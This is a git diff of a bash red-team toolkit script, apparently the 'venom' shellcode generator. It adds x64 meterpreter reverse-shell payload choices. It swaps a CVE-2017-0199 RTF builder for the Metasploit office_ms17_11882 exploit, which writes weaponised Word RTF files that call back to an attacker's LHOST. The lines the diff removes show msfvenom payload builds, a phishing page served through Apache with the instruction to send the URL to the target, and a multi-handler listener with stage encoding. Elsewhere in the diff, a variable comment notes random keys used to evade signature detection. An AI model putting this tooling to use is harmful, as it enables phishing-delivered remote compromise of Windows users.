@@ -87,6 +87,7 @@ PiWiN=`cat settings | egrep -m 1 "PYINSTALLER_VERSION" | cut -d '=' -f2` > /dev/
 mSf=`cat settings | egrep -m 1 "POST_EXPLOIT_DIR" | cut -d '=' -f2` > /dev/null 2>&1
 pHanTom=`cat settings | egrep -m 1 "POST_EXPLOIT_DIR" | cut -d '=' -f2` > /dev/null 2>&1
 ArCh=`cat settings | egrep -m 1 "SYSTEM_ARCH" | cut -d '=' -f2` > /dev/null 2>&1
+dep="/usr/share/metasploit-framework/modules/exploits/windows/fileformat" > /dev/nul 2>&1
 UUID_RANDOM_LENGTH="70" # build 23 uses random keys (comments) to evade signature detection (default 70)
 
 
@@ -213,10 +214,9 @@ echo "    |  (e.g pyherion.py) and compiled into one executable file.      |"
 echo "    |  'reproducing technics found in Veil,Unicorn,powersploit'      |"
 echo "    ╠────────────────────────────────────────────────────────────────╝"
 echo "    | Author:r00t-3xp10it | Suspicious_Shell_Activity(red_team)"
-echo "    ╘ VERSION:$ver USER:$user INTERFACE:$InT3R DISTRO:$DiStR0"
+echo "    ╘ VERSION:$ver USER:$user INTERFACE:$InT3R ARCH:$ArCh DISTRO:$DiStR0"
 echo "" && echo ""
 sleep 1
-echo "[✔] Toolkit settings:$ArCh arch's"
 echo "[☠] Press [ENTER] to continue .."
 read op
 clear
@@ -375,7 +375,7 @@ lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --wid
 
 
 # input payload choise
-paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "linux/ppc/shell_reverse_tcp" FALSE "linux/x86/shell_reverse_tcp" FALSE "linux/x86/meterpreter/reverse_tcp" FALSE "linux/x64/shell/reverse_tcp" FALSE "linux/x64/shell_reverse_tcp" FALSE "osx/armle/shell_reverse_tcp" FALSE "osx/ppc/shell_reverse_tcp" FALSE "osx/x64/shell_reverse_tcp" FALSE "bsd/x86/shell/reverse_tcp" FALSE "bsd/x64/shell_reverse_tcp" FALSE "solaris/x86/shell_reverse_tcp" --width 350 --height 420) > /dev/null 2>&1
+paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "linux/ppc/shell_reverse_tcp" FALSE "linux/x86/shell_reverse_tcp" FALSE "linux/x86/meterpreter/reverse_tcp" FALSE "linux/x64/shell/reverse_tcp" FALSE "linux/x64/shell_reverse_tcp" FALSE "linux/x64/meterpreter/reverse_tcp" FALSE "linux/x64/meterpreter/reverse_https" FALSE "osx/armle/shell_reverse_tcp" FALSE "osx/ppc/shell_reverse_tcp" FALSE "osx/x64/shell_reverse_tcp" FALSE "bsd/x86/shell/reverse_tcp" FALSE "bsd/x64/shell_reverse_tcp" FALSE "solaris/x86/shell_reverse_tcp" --width 350 --height 480) > /dev/null 2>&1
 
 echo "[☠] Building shellcode -> C format ..."
 echo "" > $IPATH/output/chars.raw
@@ -8273,9 +8273,8 @@ sh_world25 () {
 # get user input to build shellcode
 echo "[☠] Enter shellcode settings!"
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
-lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
-paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_winhttps" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_http" --width 350 --height 230) > /dev/null 2>&1
-N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1
+paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 280) > /dev/null 2>&1
+N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: office" --width 300) > /dev/null 2>&1
 
 
 # display final settings to user
@@ -8283,80 +8282,50 @@ cat << !
 
  shellcode settings
 +------------------
-| LPORT   : $lport
 | LHOST   : $lhost
-| FORMAT  : C,SSL/TLS -> WINDOWS(RTF)
+| FORMAT  : OFFICE -> WINDOWS(RTF)
 | PAYLOAD : $paylo
 |_AGENT   : $IPATH/output/$N4m.rtf
-
 
 !
 sleep 1
   #
   # check if all dependencies needed are installed
-  # check if template exists
   #
-  if [ -d $IPATH/templates/CVE-2017-0199 ]; then
-     echo "[☠] CVE-2017-0199_toolkit -> found!"
+  if [ -e $dep/office_ms17_11882.rb ]; then
+     echo "[☠] Exploit office_ms17_11882 -> found!"
      sleep 2
   else
-     echo "[☠] CVE-2017-0199_toolkit -> not found!"
-     exit
+     echo "[x] Exploit office_ms17_11882 -> not found!"
+     sleep 2
+     echo "[!] Please wait, installing required module .."
+     sleep 2
+     cp $IPATH/templates/office_ms17_11882.rb $dep/office_ms17_11882.rb
+     echo "[!] Please wait, rebuilding msfdb .."
+     sleep 1
+     xterm -T " REBUILDING MSFBD " -geometry 168x28 -e "msfdb reinit" > /dev/null 2>&1
+     echo "[!] Please wait, reloading all module paths .."
+     sleep 1
+     xterm -T " RELOADING ALL MODULE PATHS " -geometry 168x28 -e "msfconsole -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
+     echo "[✔] Exploit office_ms17_11882 installed .."
+     sleep 2
   fi
 
 
 
-#
-# build cve-2017-0199 RTF agent ..
-# python cve-2017-0199_toolkit.py -M gen -w Invoice.rtf -u http://192.168.56.1/logo.doc -x 1
-#
-echo "[☠] Generating MS_word agent .."
-sleep 2
-cd $IPATH/templates/CVE-2017-0199
-xterm -T " SHELLCODE GENERATOR " -geometry 110x10 -e "python cve-2017-0199_toolkit.py -M gen -w $N4m.rtf -u http://$lhost:8080/logo.doc -x 1 && sleep 2" > /dev/null 2>&1
-mv $IPATH/templates/CVE-2017-0199/$N4m.rtf $IPATH/output/$N4m.rtf
-echo "[☠] Agent: $IPATH/output/$N4m.rtf .."
-sleep 2
-
-
-#
-# build msf payload ..
-#
-echo "[☠] build C,SSL/TLS payload .."
-sleep 2
-xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport PayloadUUIDTracking=true HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH --smallest -f exe -o /tmp/shell.exe" > /dev/null 2>&1
-
-
   #
-  # deliver agent.rtf using apache2
+  # build cve-2017-0199 RTF agent ..
   #
-  cd $IPATH/templates/phishing
-  cp $InJEc12 mega[bak].html
-  sed "s|NaM3|$N4m.rtf|g" mega.html > copy.html
-  cp copy.html $ApAcHe/index.html > /dev/null 2>&1
+  echo "[☠] Generating MS_word agent .."
+  sleep 2
   cd $IPATH/output
-  cp $N4m.rtf $ApAcHe/$N4m.rtf > /dev/null 2>&1
-    echo "[☠] loading -> Apache2Server!"
-    echo "---"
-    echo "- SEND THE URL GENERATED TO TARGET HOST"
-    echo "- ATTACK VECTOR: http://$lhost"
-    echo "---"
-
-    cd $IPATH/templates/CVE-2017-0199
-    # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-    echo "[☠] start CVE-2017-0199_toolkit + payload handler"
-    echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-    echo "[☯] Please dont test samples on virus total..."
-   echo ""
-   xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; exploit'" & xterm -T "CVE-2017-0199_toolkit" -geometry 124x10 -e "python cve-2017-0199_toolkit.py -M exp -p 8080 -e http://$lhost:8080/shell.exe -l /tmp/shell.exe"
+  xterm -T " SHELLCODE GENERATOR " -geometry 168x28 -e "msfconsole -q -x 'use exploit/windows/fileformat/office_ms17_11882; set LHOST $lhost; set PAYLOAD $paylo; set FILENAME $IPATH/output/$N4m.rtf; exploit'" > /dev/null 2>&1
+  sleep 2
 
 
-sleep 2
+
 # CLEANING EVERYTHING UP
 echo "[☠] Cleanning temp generated files..."
-rm /tmp/shell.exe > /dev/null 2>&1
-rm $ApAcHe/shell.exe > /dev/null 2>&1
-rm $ApAcHe/index.html > /dev/null 2>&1
 rm $ApAcHe/$N4m.rtf > /dev/null 2>&1
 sleep 2
 clear
